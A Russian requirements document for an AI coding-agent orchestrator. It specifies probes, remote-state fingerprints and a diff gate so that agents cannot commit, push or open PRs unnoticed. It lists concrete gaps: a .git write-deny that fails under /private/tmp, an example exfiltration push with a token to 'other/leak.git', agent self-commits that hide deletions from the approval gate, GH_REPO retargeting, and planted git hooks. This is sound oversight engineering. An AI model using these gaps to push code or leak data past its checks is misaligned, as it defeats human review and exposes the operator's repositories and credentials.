# Предусловия пола — требования и критерии приёмки

Status: **принято в объём, реализация не начата; П1–П4 разобраны и решены, П5 снят с объёма 2026-08-17** Date: 2026-08-17 Owner: Vladimir Makarevich Основание: разбор advanced mode, раздел находок в [requirements-advanced-mode.md](requirements-advanced-mode.md) Место в очереди: **после** Шага 0 и **до** заключительной фазы ([README](README.md))

Четыре места, где заявленная гарантия — «коммит / пуш / PR делает только оркестратор» — сегодня либо не проверяется, либо не удерживается, либо удерживается наоборот. Три из четырёх являются дефектами и без всякого режима, поэтому этап окупается до того, как режим будет включён хоть раз. Пятое (учётные данные) разобрано и **снято с объёма** — решение и его последствия ниже.

Нумерация П1–П5. Каждое требование помечено вердиктом владельца там, где решение принято. Реализация разбита на три фазы: [Пре-1](phase-pre-1-floor-probe.md) закрывает П1, [Пре-2](phase-pre-2-remote-side.md) — П2 и П3 одним изменением, [Пре-3](phase-pre-3-diff-gate.md) — П4.

## П1 — пол доказывается пробой

**Решение владельца 2026-08-17.** Сегодня доказательства нет ни на одном провайдере: per-attempt канарейка Codex проверяет приватный набор и обменник ([`codex_canary.py:189`](../../../src/wastech_orchestrator/providers/codex_canary.py)) и **`.git` не трогает**, а у Claude канарейки нет вовсе — единственная проверка там юнит-тест на форму записанного JSON, то есть доказательство того, что мы попросили, а не того, что ОС послушалась.

Что делает объявление недействительным на практике, оба случая подтверждены живыми пробами: CLI **молча глотает незнакомые ключи профиля** (`network = { enabled = true, totally_bogus_key = 42 }` принимается без ошибки, то есть опечатка даёт не диагностику, а отсутствие политики), и **унаследованный грант бьёт явный `deny`** (один и тот же профиль: клон под `$HOME` — держится, под `$TMPDIR` — держится, под `/private/tmp` — **не держится**, прошли и чтение, и запись).

- **П1.1 Codex — проба в канарейку.** Рядом с существующими пробами добавляется «дописать байт в файл внутри gitdir» с ожиданием `denied` и с положительным контролем; без контроля отрицательный результат может означать «нет бинарника», а не «запрещено». Проб **две**: gitdir и git-common-dir — у linked worktree это разные каталоги, и промах в одном не заденет `.worc`, то есть существующими пробами не поймается.
- **П1.2 Claude — платный смоук по опт-ину.** Бесплатного аналога нет: песочницу создаёт сам CLI внутри сессии, подкоманды «выполни команду под тем же sandbox без модели» у него не существует. Один реальный минимальный вызов, в котором агент пробует записать в оба git-каталога, по образцу нынешнего `--capability-smoke` ([`cli.py:2919`](../../../src/wastech_orchestrator/cli.py)) — не на каждом прогоне. Отклонены: собственный запуск `sandbox-exec` / `bwrap` с теми же правилами (доказывает наше понимание системной утилиты, а не то, что Claude настраивает её так же) и «тест на форму плюс детект постфактум».
- **П1.3 Вердикт.** Проба неожиданно прошла — созданный файл удаляется, попытка падает `CONFIGURATION_ERROR` до вызова модели и без fallback. Пробу не удалось выполнить — громкая строка, прогон продолжается.

**AC1.1** Подставленный профиль без выреза `.git` даёт `CONFIGURATION_ERROR` и ноль вызовов модели. **AC1.2** Проба на common-dir отличима от пробы на gitdir: тест с linked worktree, где закрыт только один из них, падает. **AC1.3** Отсутствие положительного контроля классифицируется как «не доказано», а не как «пол держится». **AC1.4** Живая проба: клон под системным temp ловится.

## П2 — удалённая сторона попадает в отпечаток

**Решение владельца 2026-08-17: снимать по каждой попытке.**

Сегодня отпечаток вокруг попытки целиком локальный — HEAD, коммит HEAD, ссылка ветки задачи в клоне, индекс, repo-local конфиг, `core.hooksPath`, содержимое хуков, маркеры операций ([`git_manager.py:1134`](../../../src/wastech_orchestrator/git_manager.py)). Ни `ls-remote`, ни remote-tracking ссылок, ни состояния PR в нём нет ([`git_manager.py:496`](../../../src/wastech_orchestrator/git_manager.py)).

Почему это дыра именно в поле: вырез `.git` останавливает **одну операцию из четырёх**. `git commit` требует записи в `.git` и закрыт. `git push <url> HEAD:main` существующей истории читает объекты и отправляет их — записи в `.git` не требует вовсе. `gh pr create` и `gh pr merge` локально не пишут ни байта. Раньше удалённую половину держало отсутствие сети; после решения по вопросу 1 её держат отсутствие кредов и детект, а детект этих трёх операций не видит.

- **П2.1 Что снимается.** `git ls-remote --heads origin <ветка задачи>`; `git remote get-url --push origin` (резолвит `insteadOf` / `pushInsteadOf` / `pushurl` в финальный URL); `gh pr list --head <ветка> --state open`.
- **П2.2 Правило сравнения.** Удалённая ссылка ветки задачи обязана совпадать с тем, что оркестратор сам записал в `publish_operations` при своём последнем пуше, либо отсутствовать, если он ещё не пушил. Базовая ветка в сравнение **не** входит: она законно двигается, когда кто-то смержил свой PR, и парковать за это нельзя.
- **П2.3 Вердикт — `manual_action_required`, без fallback**, как у локального отпечатка. Это относится к изменению **во время попытки**; поведение на публикации задаёт П3.
- **П2.4 Адрес пуша перепроверяется безусловно прямо перед `push`** — единственное место, где ошибка попадает на настоящую ветку. Разошёлся — отказ, URL в сообщении **редактируется**: он может нести токен. Дизайн уже написан в [read-only-shell-residues.md](../read-only-shell-residues.md) (residues A): около двадцати строк и два теста.
- **П2.5 Чего это не ловит — записано честно.** Пуш в чужой репозиторий (`git push https://<токен>@github.com/other/leak.git HEAD:main`) не виден никакому отпечатку `origin`. Против него работали бы только отсутствие кредов и сетевая политика; сеть открыта решением по вопросу 1, креды оставлены агенту решением по П5 — значит **этот путь не удерживается ничем**, и так и записано в ТA.1 требований режима.

**AC2.1** Ветка задачи, появившаяся на remote во время попытки без записи в `publish_operations`, паркует задачу до checks. **AC2.2** Движение базовой ветки не паркует ничего. **AC2.3** Подменённый `pushurl` ловится перед пушем, и URL в сообщении отредактирован. **AC2.4** Открытый PR на ветку задачи, которого нет в наших записях, паркует.

## П3 — оркестратор восстанавливается, а не усыновляет

**Решение владельца 2026-08-17.** Сегодня оркестратор встречает неожиданное состояние remote и записывает его как свой успех. Два места: `push` в режиме `new` видит существующую удалённую ветку, коротко замыкается и **записывает операцию выполненной, не отправив ничего** ([`git_manager.py:1859`](../../../src/wastech_orchestrator/git_manager.py)); `_find_open_pr` находит **любой** открытый PR «ветка → база», переиспользует его и дописывает в чужое тело секцию этой задачи ([`git_manager.py:2004`](../../../src/wastech_orchestrator/git_manager.py)). Итог штатного сценария: на GitHub висит чужой код с чужим описанием, отревьюенный коммит остался на диске, все гейты отчитались об успехе.

Требование владельца шире, чем «не усыновлять»: **правки и коммиты, сделанные оператором руками, должны обрабатываться нормально и ничего не блокировать** — следить за рабочими ветками это ответственность оператора, а не оркестратора. Поэтому поведение задаётся таблицей, а не одним отказом.

- **П3.1 Четыре случая.** Различаются двумя дешёвыми вопросами: `merge-base --is-ancestor <remote> <local>` (обёртка `commit_on_branch` уже есть, [`git_manager.py:1058`](../../../src/wastech_orchestrator/git_manager.py)) и «есть ли наша запись о пуше этой ветки в `publish_operations`».

  | Случай | Условие | Действие |
  | --- | --- | --- |
  | 1. Совпадает | `remote == local` | ничего не пушим, операцию записываем выполненной |
  | 2. Remote — предок локального | `is-ancestor` истинно | обычный `git push` (fast-forward) — **здесь сегодня баг** |
  | 3. Разошлись, пуш наш | запись есть, аренда сходится | `git push --force-with-lease=<ветка>:<наш последний SHA>` |
  | 4. Разошлись, чужое | записи нет или аренда не сошлась | `git merge origin/<ветка>` → конфликт уходит в штатный путь → коммит → push |

- **П3.2 Аренда — это и есть защита правок оператора.** Если после нашего пуша оператор дописал свой коммит, `--force-with-lease` **не сойдётся**, и случай 3 провалится в случай 4, то есть его правка будет втянута, а не затёрта. Затирается только собственный устаревший пуш, когда на remote ровно то, что мы там оставили.
- **П3.3 Втягивание переиспользует существующий механизм.** Оркестратор уже умеет втягивать уехавшую базу: `git merge --no-commit --no-edit origin/<база>`, и конфликт для него — **штатное восстановимое состояние**, а не отказ ([`git_manager.py:1027`](../../../src/wastech_orchestrator/git_manager.py); рядом `merge_in_progress`, `merge_abort`, `push_branch_update`). Для чужих коммитов та же процедура направляется на `origin/<ветка задачи>`. Rebase не рассматривается: домашняя конвенция — merge.
- **П3.4 PR переиспользуется только свой.** Вместо «любого открытого PR ветка → база» берётся тот, что записан в `publish_operations` для этой задачи. Проверка идёт **до** вызова `gh pr create`, потому что на существующую пару «голова → база» он отвечает ошибкой; падать при этом не будем ни в одном случае.
- **П3.5 После втягивания чужого набор checks прогоняется заново.** Проверялась комбинация «наши коммиты поверх базы», а публикуется «наши плюс чужие». Без повторного прогона в PR уезжает непротестированное сочетание. Стоимость — один прогон checks, и только в четвёртом случае.
- **П3.6 Втянутое помечается.** Отчётный diff считается от базы до рабочего дерева, поэтому после втягивания в него попадут чужие изменения и он перестанет описывать работу этой задачи. В отчёт и тело PR добавляется строка «втянуто N посторонних коммитов: `<sha>`…».
- **П3.7 Разделение «во время попытки» и «на публикации» — принято к проверке практикой.** Пока агент работает, изменение удалённой ветки задачи **паркует** (П2.3): оператор, пушащий в ветку ровно во время прогона по ней, — случай патологический, а агент, сделавший это, — ровно то, ради чего детект заводится. На публикации, где агента нет и с прошлого прогона могли пройти дни, действует таблица П3.1. Решение владельца 2026-08-17: «пусть будет так пока что, потом проверим на практике» — то есть разделение может быть смягчено по опыту, и это не считается изменением объёма.

**AC3.1** Случай 2 действительно пушит: тест, где после нашего пуша добавлен локальный коммит, проверяет, что удалённая ссылка сдвинулась. **AC3.2** Случай 3 с чужим коммитом поверх нашего пуша не затирает его, а уходит в случай 4. **AC3.3** Случай 4 доводит задачу до PR без ручного вмешательства, включая конфликтный вариант. **AC3.4** Чужой открытый PR не дописывается. **AC3.5** После втягивания checks прогнаны повторно, а в теле PR есть строка о втянутых коммитах.

## П4 — гейт опасного диффа считается от одобренного состояния, а не от `HEAD`

**Решение владельца 2026-08-17.** Гейт — единственное место, где человек видит опасное изменение (удаление или переименование файлов, правку манифеста зависимостей, попадание в `protected_paths`) до публикации. Считается он относительно `HEAD` ([`git_manager.py:1414`](../../../src/wastech_orchestrator/git_manager.py)), то есть измеряет «что сейчас не закоммичено», а не «что сделала задача». Любой сдвиг `HEAD` между работой агента и гейтом делает его слепым. Рядом, в том же коде, отчёт считается **от базы** — так что в системе живут два разных определения «изменения», и решение о вопросе человеку принимает то из них, которое проще ослепить.

Сценарий, который это вскрывает, в режиме штатный: узел `review` получает шелл (сегодня у `read-only` его нет), прогон идёт на хосте без песочницы, где вырез `.git` не действует (решение по вопросу 4), агент удаляет двенадцать файлов, правит `package.json` и коммитит. Отпечаток видит сдвиг `HEAD`, но у `read-only` узлов принято «только предупреждение», и на шипнутом дефолте (`telegram.trace: false`) это строчка в лог-файле. Гейт видит пустоту и человека не спрашивает. `commit_code` тоже видит пустоту и возвращает `HEAD`, ничего не коммитя ([`git_manager.py:1644`](../../../src/wastech_orchestrator/git_manager.py)). Отчёт и тело PR при этом честно показывают удаление двенадцати файлов — расхождение видно прямо в артефактах прогона.

- **П4.1 Точка отсчёта — последнее состояние, которое гейт уже пропустил.** Не `HEAD` (ослепляется коммитом) и не база задачи в лоб (при декомпозиции вторая подзадача повторно спрашивала бы про удаления первой, уже одобренные). Хранится SHA последнего прошедшего гейт состояния, от него и считается разница. Агентский самокоммит от точки отсчёта не защищает: его содержимое попадает в следующее сравнение, и человека спросят.
- **П4.2 Брекет детекта перекейивается на «у попытки есть шелл».** Сегодня отпечаток снимается только вокруг пишущих агент-узлов ([`agent.py:481`](../../../src/wastech_orchestrator/core/flow/nodes/agent.py)); в режиме шелл есть у всех, и целый класс узлов остаётся без сигнала. То же требование записано для Шага 1; здесь оно обязательно.
- **П4.3 Расхождение отчёта и гейта устраняется как таковое** — это дефект и без режима: два определения «изменения» в одной системе рано или поздно разъезжаются в любую сторону.

Отклонён вариант «оставить гейт `HEAD`-относительным, но парковать любой сдвиг `HEAD` на всех узлах»: проще в реализации, но прямо противоречит принятому решению «дрейф у `read-only` — только предупреждение», и упирается в то, что предупреждение на шипнутом дефолте никто не читает.

**AC4.1** Самокоммит агента не скрывает удаления от гейта: тест, где агент коммитит удаление файла, всё равно приводит к запросу одобрения. **AC4.2** При декомпозиции одобренные на первой подзадаче удаления не спрашиваются повторно на второй. **AC4.3** `commit_code` после самокоммита агента не является no-op — состояние доводится до публикуемого. **AC4.4** Отчётный diff и вход гейта считаются от одной точки; тест сравнивает их наборы путей.

## П5 — учётные данные: снято с объёма

**Решение владельца 2026-08-17.** Разобрано и не делаем. Ни запрет на чтение `~/.ssh` / `~/.config/gh` / `~/.git-credentials` / `~/.gitconfig`, ни изъятие `GH_TOKEN` / `SSH_AUTH_SOCK` из окружения (последнее отменяет ТA.8.3 требований режима).

Обоснование владельца: в классической работе человека с агентом через чат ситуация ровно та же — задачу ставят и уходят, возвращаясь проверить результат, — и разницы с нашим сценарием здесь нет. Оркестратор должен улучшать качество и предсказуемость, а не изобретать защиту от того, что в отрасли считается нормой.

Инженерное следствие, зафиксированное вместе с решением: **изъятие только из окружения не закрывало бы ни одного пути.** Все три автоматические — `gh pr create` берёт токен из `~/.config/gh/hosts.yml` сам, `git push` по HTTPS берёт `credential.helper` из `~/.gitconfig` сам, по SSH берёт `~/.ssh/id_rsa` сам. При этом непроброс ломал бы приватные реестры пакетов у агента. Поэтому меры имели смысл только вместе, и сняты тоже вместе.

**Что из этого следует для формулировок — и это обязательная часть решения.** Пол сужается, и нигде не должно утверждаться обратное: механически удерживается целостность состояния задачи (`.git` и `.worc` неизменяемы), публикация в наш `origin` удерживается детектом (П2), а публикация куда-либо ещё — ничем. Агент в режиме имеет сеть, автоматически подхватываемые креды и право писать вне клона, чего достаточно, чтобы собрать репозиторий в `/tmp` и отправить произвольное содержимое по любому адресу. Это пишется в громкую строку preflight, в гайд и в ТA.1 требований режима.

**Что осталось найденным и незакрытым** (заводится отдельной задачей, не блокирует): `Read` для приватного набора не запрещён при выключенной read-изоляции — `internal_deny_kinds` равно `("Write", "Edit")`, когда `read_isolation_off` ([`claude.py:794`](../../../src/wastech_orchestrator/providers/claude.py)), а `disable_read_isolation` в шипнутом дефолте `True`. Значит на свежей установке инструмент `Read` читает `.worc/.env`, тогда как `cat` того же файла из шелла запрещён отдельным правилом песочницы `credentials` ([`claude.py:618`](../../../src/wastech_orchestrator/providers/claude.py)). Один и тот же файл, два разных ответа — это расхождение, а не политика.

## Не входит в этот этап

Семь находок того же разбора, каждая заводится отдельной задачей — иначе потеряются, разбор единственное место, где они записаны:

1. `.worc/git-null-hooks/` обязан быть пустым, и пустоту не проверяет никто; подложенный туда `pre-commit` исполняется внутри git-процесса оркестратора.
2. `gh` вызывается без `--repo` во всех десяти местах — `GH_REPO` из окружения перенацелит PR в другой репозиторий.
3. `memory/derived.py:38` строит окружение из собственного жёстко зашитого кортежа мимо `build_child_env` — седьмая, расходящаяся политика окружения.
4. Громкие строки preflight (`read-isolation: OFF`, `git-evidence: ON`) не покрыты ни одним тестом.
5. `.worc/logs/<id>/summary.md` становится телом PR и закоммиченным аудит-артефактом без проверки дайджеста ([`git_manager.py:1749`](../../../src/wastech_orchestrator/git_manager.py)).
6. Инструмент `Read` читает приватный набор при выключенной read-изоляции, тогда как шелл тот же файл прочитать не может (подробности в П5).
7. `worc stop --force-full` берёт `pgid` из `.worc/orchestrator.children` и делает group-kill без проверки `start_time`, в отличие от соседней ветки для PID демона ([`process_control.py:545`](../../../src/wastech_orchestrator/process_control.py)).

## Definition of Done этапа

Все AC выше зелёные; `ruff check .`, `ruff format --check .`, `mypy src`, `lint-imports`, `pytest` зелёные (плюс `interrogate` / `vulture` / `deptry`); живые пробы выполнены или явно записаны как «не доказано»; документы ветки обновлены тем же изменением. Этап закрывается **до** заключительной фазы: без него включение режима нечем проверить. П5 в DoD не входит — он снят с объёма.
